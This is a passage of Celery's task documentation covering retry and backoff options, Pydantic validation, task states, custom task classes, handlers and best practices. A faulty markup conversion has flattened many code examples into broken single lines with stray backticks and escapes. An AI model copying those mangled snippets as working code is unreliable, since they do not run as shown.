> @app.task(autoretry\_for=(RequestException,), retry\_backoff=True) def x(): ...

By default, this exponential backoff will also introduce random [jitter]() to `` ` avoid having all the tasks run at the same moment. It will also cap the maximum backoff delay to 10 minutes. All these settings can be customized via options documented below.  .. versionadded:: 4.4  You can also set `autoretry_for`, `max_retries`, `retry_backoff`, `retry_backoff_max` and `retry_jitter` options in class-based tasks: ``\`python class BaseTaskWithRetry(Task): autoretry\_for = (TypeError,) max\_retries = 5 retry\_backoff = True retry\_backoff\_max = 700 retry\_jitter = False

<div class="attribute">

Task.autoretry\_for

A list/tuple of exception classes. If any of these exceptions are raised during the execution of the task, the task will automatically be retried. By default, no exceptions will be autoretried.

</div>

<div class="attribute">

Task.max\_retries

A number. Maximum number of retries before giving up. A value of `None` means task will retry forever. By default, this option is set to `3`.

</div>

<div class="attribute">

Task.retry\_backoff

A boolean, or a number. If this option is set to `True`, autoretries will be delayed following the rules of [exponential backoff](). The first retry will have a delay of 1 second, the second retry will have a delay of 2 seconds, the third will delay 4 seconds, the fourth will delay 8 seconds, and so on. (However, this delay value is modified by <span class="title-ref">\~Task.retry\_jitter</span>, if it is enabled.) If this option is set to a number, it is used as a delay factor. For example, if this option is set to `3`, the first retry will delay 3 seconds, the second will delay 6 seconds, the third will delay 12 seconds, the fourth will delay 24 seconds, and so on. By default, this option is set to `False`, and autoretries will not be delayed.

</div>

<div class="attribute">

Task.retry\_backoff\_max

A number. If `retry_backoff` is enabled, this option will set a maximum delay in seconds between task autoretries. By default, this option is set to `600`, which is 10 minutes.

</div>

<div class="attribute">

Task.retry\_jitter

A boolean. [Jitter]() is used to introduce randomness into exponential backoff delays, to prevent all tasks in the queue from being executed simultaneously. If this option is set to `True`, the delay value calculated by <span class="title-ref">\~Task.retry\_backoff</span> is treated as a maximum, and the actual delay value will be a random number between zero and that maximum. By default, this option is set to `True`.

</div>

<div class="versionadded">

5.3.0

</div>

<div class="attribute">

Task.dont\_autoretry\_for

A list/tuple of exception classes. These exceptions won't be autoretried. This allows to exclude some exceptions that match `autoretry_for
<Task.autoretry_for>` but for which you don't want a retry.

</div>

<div id="task-pydantic">

Argument validation with Pydantic `` ` =================================  .. versionadded:: 5.5.0  You can use Pydantic_ to validate and convert arguments as well as serializing results based on typehints by passing ``pydantic=True`.  .. NOTE::     Argument validation only covers arguments/return values on the task side. You still have    serialize arguments yourself when invoking a task with`delay()`or`apply\_async()`.  For example:`\`python from pydantic import BaseModel

</div>

>   - class ArgModel(BaseModel):  
>     value: int
> 
>   - class ReturnModel(BaseModel):  
>     value: str
> 
> @app.task(pydantic=True) def x(arg: ArgModel) -\> ReturnModel: \# args/kwargs type hinted as Pydantic model will be converted assert isinstance(arg, ArgModel)
> 
> > \# The returned model will be converted to a dict automatically return ReturnModel(value=f"example: {arg.value}")

The task can then be called using a dict matching the model, and you'll receive `` ` the returned model "dumped" (serialized using ``BaseModel.model\_dump()`):`\`python \>\>\> result = x.delay({'value': 1}) \>\>\> result.get(timeout=1) {'value': 'example: 1'}

Union types, arguments to generics `` ` ----------------------------------  Union types (e.g. ``Union\[SomeModel, OtherModel\]`) or arguments to generics (e.g.`list\[SomeModel\]`) are **not** supported.  In case you want to support a list or similar types, it is recommended to use`pydantic.RootModel`.   Optional parameters/return values ---------------------------------  Optional parameters or return values are also handled properly. For example, given this task:`\`python from typing import Optional

> \# models are the same as above
> 
> @app.task(pydantic=True) def x(arg: Optional\[ArgModel\] = None) -\> Optional\[ReturnModel\]: if arg is None: return None return ReturnModel(value=f"example: {arg.value}")

You'll get the following behavior:

``` python
>>> result = x.delay()
>>> result.get(timeout=1) is None
True
>>> result = x.delay({'value': 1})
>>> result.get(timeout=1)
{'value': 'example: 1'}
```

Return value handling `` ` ---------------------  Return values will only be serialized if the returned model matches the annotation. If you pass a model instance of a different type, it will *not* be serialized. ``mypy``should already catch such errors and you should fix your typehints then.   Pydantic parameters -------------------  There are a few more options influencing Pydantic behavior:  .. attribute:: Task.pydantic_strict     By default, `strict mode <https://docs.pydantic.dev/dev/concepts/strict_mode/>`_    is disabled. You can pass``True``to enable strict model validation.  .. attribute:: Task.pydantic_context     Pass `additional validation context    <https://docs.pydantic.dev/dev/concepts/validators/#validation-context>`_ during    Pydantic model validation. The context already includes the application object as``celery\_app`and the task name as`celery\_task\_name`by default.  .. attribute:: Task.pydantic_dump_kwargs     When serializing a result, pass these additional arguments to`dump\_kwargs()`.    By default, only`mode='json'``is passed.   .. _task-options:  List of Options ===============  The task decorator can take a number of options that change the way the task behaves, for example you can set the rate limit for a task using the `rate_limit` option.  Any keyword argument passed to the task decorator will actually be set as an attribute of the resulting task class, and this is a list of the built-in attributes.  General -------  .. _task-general-options:  .. attribute:: Task.name      The name the task is registered as.      You can set this name manually, or a name will be     automatically generated using the module and class name.      See also [task-names](#task-names).  .. attribute:: Task.request      If the task is being executed this will contain information     about the current request. Thread local storage is used.      See [task-request-info](#task-request-info).  .. attribute:: Task.max_retries      Only applies if the task calls``self.retry``or if the task is decorated     with the [autoretry_for <task-autoretry>](#autoretry_for-<task-autoretry>) argument.      The maximum number of attempted retries before giving up.     If the number of retries exceeds this value a `~@MaxRetriesExceededError`     exception will be raised.      > **Note** >          You have to call `~@Task.retry`         manually, as it won't automatically retry on exception..      The default is``3``.     A value of `None` will disable the retry limit and the     task will retry forever until it succeeds.  .. attribute:: Task.throws      Optional tuple of expected error classes that shouldn't be regarded     as an actual error.      Errors in this list will be reported as a failure to the result backend,     but the worker won't log the event as an error, and no traceback will     be included.      Example:``\`python @task(throws=(KeyError, HttpNotFound)): def get\_foo(): something()

> Error types:
> 
>   - Expected errors (in `Task.throws`)
>     
>     > Logged with severity `INFO`, traceback excluded.
> 
>   - Unexpected errors
>     
>     > Logged with severity `ERROR`, with traceback included.

<div class="attribute">

Task.default\_retry\_delay

Default time in seconds before a retry of the task should be executed. Can be either <span class="title-ref">int</span> or <span class="title-ref">float</span>. Default is a three minute delay.

</div>

<div class="attribute">

Task.rate\_limit

Set the rate limit for this task type (limits the number of tasks that can be run in a given time frame). Tasks will still complete when a rate limit is in effect, but it may take some time before it's allowed to start.

If this is <span class="title-ref">None</span> no rate limit is in effect. If it is an integer or float, it is interpreted as "tasks per second".

The rate limits can be specified in seconds, minutes or hours by appending <span class="title-ref">"/s"</span>, <span class="title-ref">"/m"</span> or <span class="title-ref">"/h"</span> to the value. Tasks will be evenly distributed over the specified time frame.

Example: <span class="title-ref">"100/m"</span> (hundred tasks a minute). This will enforce a minimum delay of 600ms between starting two tasks on the same worker instance.

Default is the `task_default_rate_limit` setting: if not specified means rate limiting for tasks is disabled by default.

Note that this is a *per worker instance* rate limit, and not a global rate limit. To enforce a global rate limit (e.g., for an API with a maximum number of requests per second), you must restrict to a given queue.

</div>

<div class="attribute">

Task.time\_limit

The hard time limit, in seconds, for this task. When not set the workers default is used.

</div>

<div class="attribute">

Task.soft\_time\_limit

The soft time limit for this task. When not set the workers default is used.

</div>

<div class="attribute">

Task.ignore\_result

Don't store task state. Note that this means you can't use <span class="title-ref">\~celery.result.AsyncResult</span> to check if the task is ready, or get its return value.

Note: Certain features will not work if task results are disabled. For more details check the Canvas documentation.

</div>

<div class="attribute">

Task.store\_errors\_even\_if\_ignored

If <span class="title-ref">True</span>, errors will be stored even if the task is configured to ignore results.

</div>

<div class="attribute">

Task.serializer

A string identifying the default serialization method to use. Defaults to the `task_serializer` setting. Can be <span class="title-ref">pickle</span>, <span class="title-ref">json</span>, <span class="title-ref">yaml</span>, or any custom serialization methods that have been registered with `kombu.serialization.registry`.

Please see \[calling-serializers\](\#calling-serializers) for more information.

</div>

<div class="attribute">

Task.compression

A string identifying the default compression scheme to use.

Defaults to the `task_compression` setting. Can be <span class="title-ref">gzip</span>, or <span class="title-ref">bzip2</span>, or any custom compression schemes that have been registered with the `kombu.compression` registry.

Please see \[calling-compression\](\#calling-compression) for more information.

</div>

<div class="attribute">

Task.backend

The result store backend to use for this task. An instance of one of the backend classes in <span class="title-ref">celery.backends</span>. Defaults to <span class="title-ref">app.backend</span>, defined by the `result_backend` setting.

</div>

<div class="attribute">

Task.acks\_late

If set to <span class="title-ref">True</span> messages for this task will be acknowledged **after** the task has been executed, not *just before* (the default behavior).

Note: This means the task may be executed multiple times should the worker crash in the middle of execution. Make sure your tasks are `idempotent`.

The global default can be overridden by the `task_acks_late` setting.

</div>

<div id="task-track-started">

<div class="attribute">

Task.track\_started

If <span class="title-ref">True</span> the task will report its status as "started" when the task is executed by a worker. The default value is <span class="title-ref">False</span> as the normal behavior is to not report that level of granularity. Tasks are either pending, finished, or waiting to be retried. Having a "started" status can be useful for when there are long running tasks and there's a need to report what task is currently running.

The host name and process id of the worker executing the task will be available in the state meta-data (e.g., <span class="title-ref">result.info\['pid'\]</span>)

The global default can be overridden by the `task_track_started` setting.

</div>

</div>

<div class="seealso">

The API reference for <span class="title-ref">\~@Task</span>.

</div>

<div id="task-states">

States `` ` ======  Celery can keep track of the tasks current state. The state also contains the result of a successful task, or the exception and traceback information of a failed task.  There are several *result backends* to choose from, and they all have different strengths and weaknesses (see [task-result-backends](#task-result-backends)).  During its lifetime a task will transition through several possible states, and each state may have arbitrary meta-data attached to it. When a task moves into a new state the previous state is forgotten about, but some transitions can be deduced, (e.g., a task now in the :state:`FAILED` state, is implied to have been in the :state:`STARTED` state at some point).  There are also sets of states, like the set of :state:`FAILURE_STATES`, and the set of :state:`READY_STATES`.  The client uses the membership of these sets to decide whether the exception should be re-raised (:state:`PROPAGATE_STATES`), or whether the state can be cached (it can if the task is ready).  You can also define [custom-states](#custom-states).  .. _task-result-backends:  Result Backends ---------------  If you want to keep track of tasks or need the return values, then Celery must store or send the states somewhere so that they can be retrieved later. There are several built-in result backends to choose from: SQLAlchemy/Django ORM, Memcached, RabbitMQ/QPid ( ``rpc``), and Redis -- or you can define your own.  No backend works well for every use case. You should read about the strengths and weaknesses of each backend, and choose the most appropriate for your needs.  > **Warning** >      Backends use resources to store and transmit results. To ensure     that resources are released, you must eventually call     `~@AsyncResult.get` or `~@AsyncResult.forget` on     EVERY `~@AsyncResult` instance returned after calling     a task.  .. seealso::      [conf-result-backend](#conf-result-backend)  RPC Result Backend (RabbitMQ/QPid) ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  The RPC result backend (`rpc://`) is special as it doesn't actually *store* the states, but rather sends them as messages. This is an important difference as it means that a result *can only be retrieved once*, and *only by the client that initiated the task*. Two different processes can't wait for the same result.  Even with that limitation, it is an excellent choice if you need to receive state changes in real-time. Using messaging means the client doesn't have to poll for new states.  The messages are transient (non-persistent) by default, so the results will disappear if the broker restarts. You can configure the result backend to send persistent messages using the :setting:`result_persistent` setting.  Database Result Backend ~~~~~~~~~~~~~~~~~~~~~~~  Keeping state in the database can be convenient for many, especially for web applications with a database already in place, but it also comes with limitations.  * Polling the database for new states is expensive, and so you should   increase the polling intervals of operations, such as `result.get()`.  * Some databases use a default transaction isolation level that   isn't suitable for polling tables for changes.    In MySQL the default transaction isolation level is `REPEATABLE-READ`:   meaning the transaction won't see changes made by other transactions until   the current transaction is committed.    Changing that to the `READ-COMMITTED` isolation level is recommended.  .. _task-builtin-states:  Built-in States ---------------  .. state:: PENDING  PENDING ~~~~~~~  Task is waiting for execution or unknown. Any task id that's not known is implied to be in the pending state.  .. state:: STARTED  STARTED ~~~~~~~  Task has been started. Not reported by default, to enable please see `@Task.track_started`.  :meta-data: `pid` and `hostname` of the worker process executing             the task.  .. state:: SUCCESS  SUCCESS ~~~~~~~  Task has been successfully executed.  :meta-data: `result` contains the return value of the task. :propagates: Yes :ready: Yes  .. state:: FAILURE  FAILURE ~~~~~~~  Task execution resulted in failure.  :meta-data: `result` contains the exception occurred, and `traceback`             contains the backtrace of the stack at the point when the             exception was raised. :propagates: Yes  .. state:: RETRY  RETRY ~~~~~  Task is being retried.  :meta-data: `result` contains the exception that caused the retry,             and `traceback` contains the backtrace of the stack at the point             when the exceptions was raised. :propagates: No  .. state:: REVOKED  REVOKED ~~~~~~~  Task has been revoked.  :propagates: Yes  .. _custom-states:  Custom states -------------  You can easily define your own states, all you need is a unique name. The name of the state is usually an uppercase string. As an example you could have a look at the :mod:`abortable tasks <~celery.contrib.abortable>` which defines a custom :state:`ABORTED` state.  Use `~@Task.update_state` to update a task's state:.``\`python @app.task(bind=True) def upload\_files(self, filenames): for i, file in enumerate(filenames): if not self.request.called\_directly: self.update\_state(state='PROGRESS', meta={'current': i, 'total': len(filenames)})

</div>

Here I created the state <span class="title-ref">"PROGRESS"</span>, telling any application `` ` aware of this state that the task is currently in progress, and also where it is in the process by having `current` and `total` counts as part of the state meta-data. This can then be used to create progress bars for example.  .. _pickling_exceptions:  Creating pickleable exceptions ------------------------------  A rarely known Python fact is that exceptions must conform to some simple rules to support being serialized by the pickle module.  Tasks that raise exceptions that aren't pickleable won't work properly when Pickle is used as the serializer.  To make sure that your exceptions are pickleable the exception *MUST* provide the original arguments it was instantiated with in its ``.args`attribute. The simplest way to ensure this is to have the exception call`Exception.\_\_init\_\_`.  Let's look at some examples that work, and one that doesn't:`\`python \# OK: class HttpError(Exception): pass

> \# BAD: class HttpError(Exception):
> 
> >   - def \_\_init\_\_(self, status\_code):  
> >     self.status\_code = status\_code
> 
> \# OK: class HttpError(Exception):
> 
> >   - def \_\_init\_\_(self, status\_code):  
> >     self.status\_code = status\_code Exception.\_\_init\_\_(self, status\_code) \# \<-- REQUIRED

So the rule is: `` ` For any exception that supports custom arguments ``*args\`\`, \`\`Exception.\_\_init\_\_(self,*args)`must be used.  There's no special support for *keyword arguments*, so if you want to preserve keyword arguments when the exception is unpickled you have to pass them as regular args:`\`python class HttpError(Exception):

>   - def \_\_init\_\_(self, status\_code, headers=None, body=None):  
>     self.status\_code = status\_code self.headers = headers self.body = body
>     
>     super(HttpError, self).\_\_init\_\_(status\_code, headers, body)

<div id="task-semipredicates">

Semipredicates `` ` ==============  The worker wraps the task in a tracing function that records the final state of the task. There are a number of exceptions that can be used to signal this function to change how it treats the return of the task.  .. _task-semipred-ignore:  Ignore ------  The task may raise `~@Ignore` to force the worker to ignore the task. This means that no state will be recorded for the task, but the message is still acknowledged (removed from queue).  This can be used if you want to implement custom revoke-like functionality, or manually store the result of a task.  Example keeping revoked tasks in a Redis set: ``\`python from celery.exceptions import Ignore

</div>

> @app.task(bind=True) def some\_task(self): if redis.ismember('tasks.revoked', self.request.id): raise Ignore()

Example that stores results manually:

``` python
from celery import states
from celery.exceptions import Ignore

@app.task(bind=True)
def get_tweets(self, user):
    timeline = twitter.get_timeline(user)
    if not self.request.called_directly:
        self.update_state(state=states.SUCCESS, meta=timeline)
    raise Ignore()
```

<div id="task-semipred-reject">

Reject `` ` ------  The task may raise `~@Reject` to reject the task message using AMQPs ``basic\_reject``method. This won't have any effect unless `Task.acks_late` is enabled.  Rejecting a message has the same effect as acking it, but some brokers may implement additional functionality that can be used. For example RabbitMQ supports the concept of `Dead Letter Exchanges`_ where a queue can be configured to use a dead letter exchange that rejected messages are redelivered to.    Reject can also be used to re-queue messages, but please be very careful when using this as it can easily result in an infinite message loop.  Example using reject when a task causes an out of memory condition:``\`python import errno from celery.exceptions import Reject

</div>

> @app.task(bind=True, acks\_late=True) def render\_scene(self, path): file = get\_file(path) try: renderer.render\_scene(file)
> 
> > \# if the file is too big to fit in memory \# we reject it so that it's redelivered to the dead letter exchange \# and we can manually inspect the situation. except MemoryError as exc: raise Reject(exc, requeue=False) except OSError as exc: if exc.errno == errno.ENOMEM: raise Reject(exc, requeue=False)
> > 
> > \# For any other error we retry after 10 seconds. except Exception as exc: raise self.retry(exc, countdown=10)

Example re-queuing the message:

``` python
from celery.exceptions import Reject

@app.task(bind=True, acks_late=True)
def requeues(self):
    if not self.request.delivery_info['redelivered']:
        raise Reject('no reason', requeue=True)
    print('received two times')
```

Consult your broker documentation for more details about the `basic_reject` `` ` method.   .. _task-semipred-retry:  Retry -----  The `~@Retry` exception is raised by the ``Task.retry``method to tell the worker that the task is being retried.  .. _task-custom-classes:  Custom task classes ===================  All tasks inherit from the `@Task` class. The `~@Task.run` method becomes the task body.  As an example, the following code,``\`python @app.task def add(x, y): return x + y

will do roughly this behind the scenes:

``` python
class _AddTask(app.Task):

    def run(self, x, y):
        return x + y
add = app.tasks[_AddTask.name]
```

Instantiation `` ` -------------  A task is **not** instantiated for every request, but is registered in the task registry as a global instance.  This means that the ``\_\_init\_\_`constructor will only be called once per process, and that the task class is semantically closer to an Actor.  If you have a task,`\`python from celery import Task

> class NaiveAuthenticateServer(Task):
> 
> >   - def \_\_init\_\_(self):  
> >     self.users = {'george': 'password'}
> > 
> >   - def run(self, username, password):
> >     
> >       - try:  
> >         return self.users\[username\] == password
> >     
> >       - except KeyError:  
> >         return False

And you route every request to the same process, then it `` ` will keep state between requests.  This can also be useful to cache resources, For example, a base Task class that caches a database connection: ``\`python from celery import Task

>   - class DatabaseTask(Task):  
>     \_db = None
>     
>     @property def db(self): if self.\_db is None: self.\_db = Database.connect() return self.\_db

Per task usage `` ` ~~~~~~~~~~~~~~  The above can be added to each task like this: ``\`python from celery.app import task

> @app.task(base=DatabaseTask, bind=True) def process\_rows(self: task): for row in self.db.table.all(): process\_row(row)

The `db` attribute of the `process_rows` task will then `` ` always stay the same in each process.  .. _custom-task-cls-app-wide:  App-wide usage ~~~~~~~~~~~~~~  You can also use your custom class in your whole Celery app by passing it as the ``task\_cls`argument when instantiating the app. This argument should be either a string giving the python path to your Task class or the class itself:`\`python from celery import Celery

> app = Celery('tasks', task\_cls='your.module.path:DatabaseTask')

This will make all your tasks declared using the decorator syntax within your `` ` app to use your ``DatabaseTask`class and will all have a`db`attribute.  The default value is the class provided by Celery:`'celery.app.task:Task'``.  Handlers --------  .. method:: before_start(self, task_id, args, kwargs)      Run by the worker before the task starts executing.      .. versionadded:: 5.2      :param task_id: Unique id of the task to execute.     :param args: Original arguments for the task to execute.     :param kwargs: Original keyword arguments for the task to execute.      The return value of this handler is ignored.  .. method:: after_return(self, status, retval, task_id, args, kwargs, einfo)      Handler called after the task returns.      :param status: Current task state.     :param retval: Task return value/exception.     :param task_id: Unique id of the task.     :param args: Original arguments for the task that returned.     :param kwargs: Original keyword arguments for the task                    that returned.      :keyword einfo: `~billiard.einfo.ExceptionInfo`                     instance, containing the traceback (if any).      The return value of this handler is ignored.  .. method:: on_failure(self, exc, task_id, args, kwargs, einfo)      This is run by the worker when the task fails.      :param exc: The exception raised by the task.     :param task_id: Unique id of the failed task.     :param args: Original arguments for the task that failed.     :param kwargs: Original keyword arguments for the task                        that failed.      :keyword einfo: `~billiard.einfo.ExceptionInfo`                            instance, containing the traceback.      The return value of this handler is ignored.  .. method:: on_retry(self, exc, task_id, args, kwargs, einfo)      This is run by the worker when the task is to be retried.      :param exc: The exception sent to `~@Task.retry`.     :param task_id: Unique id of the retried task.     :param args: Original arguments for the retried task.     :param kwargs: Original keyword arguments for the retried task.      :keyword einfo: `~billiard.einfo.ExceptionInfo`                     instance, containing the traceback.      The return value of this handler is ignored.  .. method:: on_success(self, retval, task_id, args, kwargs)      Run by the worker if the task executes successfully.      :param retval: The return value of the task.     :param task_id: Unique id of the executed task.     :param args: Original arguments for the executed task.     :param kwargs: Original keyword arguments for the executed task.      The return value of this handler is ignored.  .. _task-requests-and-custom-requests:  Requests and custom requests ----------------------------  Upon receiving a message to run a task, the `worker <guide-workers>`:ref: creates a `request <celery.worker.request.Request>`:class: to represent such demand.  Custom task classes may override which request class to use by changing the attribute `celery.app.task.Task.Request`:attr:.  You may either assign the custom request class itself, or its fully qualified name.  The request has several responsibilities.  Custom request classes should cover them all -- they are responsible to actually run and trace the task.  We strongly recommend to inherit from `celery.worker.request.Request`:class:.  When using the `pre-forking worker <worker-concurrency>`:ref:, the methods `~celery.worker.request.Request.on_timeout`:meth: and `~celery.worker.request.Request.on_failure`:meth: are executed in the main worker process.  An application may leverage such facility to detect failures which are not detected using `celery.app.task.Task.on_failure`:meth:.  As an example, the following custom request detects and logs hard time limits, and other failures.``\`python import logging from celery import Task from celery.worker.request import Request

> logger = logging.getLogger('my.package')
> 
>   - class MyRequest(Request):  
>     'A minimal custom request to log failures and hard time limits.'
>     
>       - def on\_timeout(self, soft, timeout):  
>         super(MyRequest, self).on\_timeout(soft, timeout) if not soft: logger.warning( 'A hard timeout was enforced for task %s', self.task.name )
>     
>       - def on\_failure(self, exc\_info, send\_failed\_event=True, return\_ok=False):
>         
>           - super().on\_failure(  
>             exc\_info, send\_failed\_event=send\_failed\_event, return\_ok=return\_ok
>         
>         ) logger.warning( 'Failure detected for task %s', self.task.name )
> 
>   - class MyTask(Task):  
>     Request = MyRequest \# you can use a FQN 'my.package:MyRequest'
> 
> @app.task(base=MyTask) def some\_longrunning\_task(): \# use your imagination

<div id="task-how-they-work">

How it works `` ` ============  Here come the technical details. This part isn't something you need to know, but you may be interested.  All defined tasks are listed in a registry. The registry contains a list of task names and their task classes. You can investigate this registry yourself: ``\`pycon \>\>\> from proj.celery import app \>\>\> app.tasks {'celery.chord\_unlock': \<@task: celery.chord\_unlock\>, 'celery.backend\_cleanup': \<@task: celery.backend\_cleanup\>, 'celery.chord': \<@task: celery.chord\>}

</div>

This is the list of tasks built into Celery. Note that tasks `` ` will only be registered when the module they're defined in is imported.  The default loader imports any modules listed in the :setting:`imports` setting.  The `@task` decorator is responsible for registering your task in the applications task registry.  When tasks are sent, no actual function code is sent with it, just the name of the task to execute. When the worker then receives the message it can look up the name in its task registry to find the execution code.  This means that your workers should always be updated with the same software as the client. This is a drawback, but the alternative is a technical challenge that's yet to be solved.  .. _task-best-practices:  Tips and Best Practices =======================  .. _task-ignore_results:  Ignore results you don't want -----------------------------  If you don't care about the results of a task, be sure to set the `~@Task.ignore_result` option, as storing results wastes time and resources. ``\`python @app.task(ignore\_result=True) def mytask(): something()

Results can even be disabled globally using the `task_ignore_result` `` ` setting.  .. versionadded::4.2  Results can be enabled/disabled on a per-execution basis, by passing the ``ignore\_result`boolean parameter, when calling`apply\_async`.`\`python @app.task def mytask(x, y): return x + y

> \# No result will be stored result = mytask.apply\_async((1, 2), ignore\_result=True) print(result.get()) \# -\> None
> 
> \# Result will be stored result = mytask.apply\_async((1, 2), ignore\_result=False) print(result.get()) \# -\> 3

By default tasks will *not ignore results* (`ignore_result=False`) when a result backend is configured.

The option precedence order is the following:

1\. Global `task_ignore_result` `` ` 2. `~@Task.ignore_result` option 3. Task execution option ``ignore\_result`More optimization tips ----------------------  You find additional optimization tips in the [Optimizing Guide <guide-optimizing>](#optimizing-guide-<guide-optimizing>).  .. _task-synchronous-subtasks:  Avoid launching synchronous subtasks ------------------------------------  Having a task wait for the result of another task is really inefficient, and may even cause a deadlock if the worker pool is exhausted.  Make your design asynchronous instead, for example by using *callbacks*.  **Bad**:`\`python @app.task def update\_page\_info(url): page = fetch\_page.delay(url).get() info = parse\_page.delay(page).get() store\_page\_info.delay(url, info)

> @app.task def fetch\_page(url): return myhttplib.get(url)
> 
> @app.task def parse\_page(page): return myparser.parse\_document(page)
> 
> @app.task def store\_page\_info(url, info): return PageInfo.objects.create(url, info)

**Good**:

``` python
def update_page_info(url):
    # fetch_page -> parse_page -> store_page
    chain = fetch_page.s(url) | parse_page.s() | store_page_info.s(url)
    chain()

@app.task()
def fetch_page(url):
    return myhttplib.get(url)

@app.task()
def parse_page(page):
    return myparser.parse_document(page)

@app.task(ignore_result=True)
def store_page_info(info, url):
    PageInfo.objects.create(url=url, info=info)
```

Here I instead created a chain of tasks by linking together `` ` different `~celery.signature`'s. You can read about chains and other powerful constructs at [designing-workflows](#designing-workflows).  By default Celery will not allow you to run subtasks synchronously within a task, but in rare or extreme cases you might need to do so. **WARNING**: enabling subtasks to run synchronously is not recommended! ``\`python @app.task def update\_page\_info(url): page = fetch\_page.delay(url).get(disable\_sync\_subtasks=False) info = parse\_page.delay(page).get(disable\_sync\_subtasks=False) store\_page\_info.delay(url, info)

> @app.task def fetch\_page(url): return myhttplib.get(url)
> 
> @app.task def parse\_page(page): return myparser.parse\_document(page)
> 
> @app.task def store\_page\_info(url, info): return PageInfo.objects.create(url, info)

<div id="task-performance-and-strategies">

Performance and Strategies `` ` ==========================  .. _task-granularity:  Granularity -----------  The task granularity is the amount of computation needed by each subtask. In general it is better to split the problem up into many small tasks rather than have a few long running tasks.  With smaller tasks you can process more tasks in parallel and the tasks won't run long enough to block the worker from processing other waiting tasks.  However, executing a task does have overhead. A message needs to be sent, data may not be local, etc. So if the tasks are too fine-grained the overhead added probably removes any benefit.  .. seealso::      The book `Art of Concurrency`_ has a section dedicated to the topic     of task granularity [AOC1]_.       .. _task-data-locality:  Data locality -------------  The worker processing the task should be as close to the data as possible. The best would be to have a copy in memory, the worst would be a full transfer from another continent.  If the data is far away, you could try to run another worker at location, or if that's not possible - cache often used data, or preload data you know is going to be used.  The easiest way to share data between workers is to use a distributed cache system, like `memcached`_.  .. seealso::      The paper `Distributed Computing Economics`_ by Jim Gray is an excellent     introduction to the topic of data locality.       .. _task-state:  State -----  Since Celery is a distributed system, you can't know which process, or on what machine the task will be executed. You can't even know if the task will run in a timely manner.  The ancient async sayings tells us that “asserting the world is the responsibility of the task”. What this means is that the world view may have changed since the task was requested, so the task is responsible for making sure the world is how it should be;  If you have a task that re-indexes a search engine, and the search engine should only be re-indexed at maximum every 5 minutes, then it must be the tasks responsibility to assert that, not the callers.  Another gotcha is Django model objects. They shouldn't be passed on as arguments to tasks. It's almost always better to re-fetch the object from the database when the task is running instead,  as using old data may lead to race conditions.  Imagine the following scenario where you have an article and a task that automatically expands some abbreviations in it: ``\`python class Article(models.Model): title = models.CharField() body = models.TextField()

</div>

> @app.task def expand\_abbreviations(article): article.body.replace('MyCorp', 'My Corporation') article.save()

First, an author creates an article and saves it, then the author `` ` clicks on a button that initiates the abbreviation task: ``\`pycon \>\>\> article = Article.objects.get(id=102) \>\>\> expand\_abbreviations.delay(article)

Now, the queue is very busy, so the task won't be run for another 2 minutes. `` ` In the meantime another author makes changes to the article, so when the task is finally run, the body of the article is reverted to the old version because the task had the old body in its argument.  Fixing the race condition is easy, just use the article id instead, and re-fetch the article in the task body: ``\`python @app.task def expand\_abbreviations(article\_id): article = Article.objects.get(id=article\_id) article.body.replace('MyCorp', 'My Corporation') article.save()

``` pycon
>>> expand_abbreviations.delay(article_id)
```

There might even be performance benefits to this approach, as sending large `` ` messages may be expensive.  .. _task-database-transactions:  Database transactions ---------------------  Let's have a look at another example: ``\`python from django.db import transaction from django.http import HttpResponseRedirect

> @transaction.atomic def create\_article(request): article = Article.objects.create() expand\_abbreviations.delay(article.pk) return HttpResponseRedirect('/articles/')

This is a Django view creating an article object in the database, `` ` then passing the primary key to a task. It uses the `transaction.atomic` decorator, that will commit the transaction when the view returns, or roll back if the view raises an exception.  There's a race condition if the task starts executing before the transaction has been committed; The database object doesn't exist yet!  The solution is to use `~celery.contrib.django.task.DjangoTask.delay_on_commit` instead: ``\`python from django.db import transaction from django.http import HttpResponseRedirect

> @transaction.atomic def create\_article(request): article = Article.objects.create() expand\_abbreviations.delay\_on\_commit(article.pk) return HttpResponseRedirect('/articles/')

This method was added in Celery 5.4. It's a shortcut that uses Django's `` ` ``on\_commit`callback to launch your Celery task once all transactions have been committed successfully.  With Celery <5.4 ~~~~~~~~~~~~~~~~  If you're using an older version of Celery, you can replicate this behaviour using the Django callback directly as follows:`\`python import functools from django.db import transaction from django.http import HttpResponseRedirect

> @transaction.atomic def create\_article(request): article = Article.objects.create() transaction.on\_commit( functools.partial(expand\_abbreviations.delay, article.pk) ) return HttpResponseRedirect('/articles/')

<div class="note">

<div class="title">

Note

</div>

`on_commit` is available in Django 1.9 and above, if you are using a version prior to that then the [django-transaction-hooks](https://github.com/carljm/django-transaction-hooks) library adds support for this.

</div>

<div id="task-example">

Example `` ` =======  Let's take a real world example: a blog where comments posted need to be filtered for spam. When the comment is created, the spam filter runs in the background, so the user doesn't have to wait for it to finish.  I have a Django blog application allowing comments on blog posts. I'll describe parts of the models/views and tasks for this application. ``blog/models.py`------------------  The comment model looks like this:`\`python from django.db import models from django.utils.translation import ugettext\_lazy as \_

</div>

>   - class Comment(models.Model):  
>     name = models.CharField(\_('name'), max\_length=64) email\_address = models.EmailField(\_('email address')) homepage = models.URLField(\_('home page'), blank=True, verify\_exists=False) comment = models.TextField(\_('comment')) pub\_date = models.DateTimeField(\_('Published date'), editable=False, auto\_add\_now=True) is\_spam = models.BooleanField(\_('spam?'), default=False, editable=False)
>     
>       - class Meta:  
>         verbose\_name = \_('comment') verbose\_name\_plural = \_('comments')

In the view where the comment is posted, I first write the comment `` ` to the database, then I launch the spam filter task in the background.  .. _task-example-blog-views: ``blog/views.py`-----------------`\`python from django import forms from django.http import HttpResponseRedirect from django.template.context import RequestContext from django.shortcuts import get\_object\_or\_404, render\_to\_response

> from blog import tasks from blog.models import Comment
> 
> class CommentForm(forms.ModelForm):
> 
> >   - class Meta:  
> >     model = Comment
> 
>   - def add\_comment(request, slug, template\_name='comments/create.html'):  
>     post = get\_object\_or\_404(Entry, slug=slug) remote\_addr = request.META.get('REMOTE\_ADDR')
>     
>       - if request.method == 'post':  
>         form = CommentForm(request.POST, request.FILES) if form.is\_valid(): comment = form.save() \# Check spam asynchronously. tasks.spam\_filter.delay(comment\_id=comment.id, remote\_addr=remote\_addr) return HttpResponseRedirect(post.get\_absolute\_url())
>     
>       - else:  
>         form = CommentForm()
>     
>     context = RequestContext(request, {'form': form}) return render\_to\_response(template\_name, context\_instance=context)

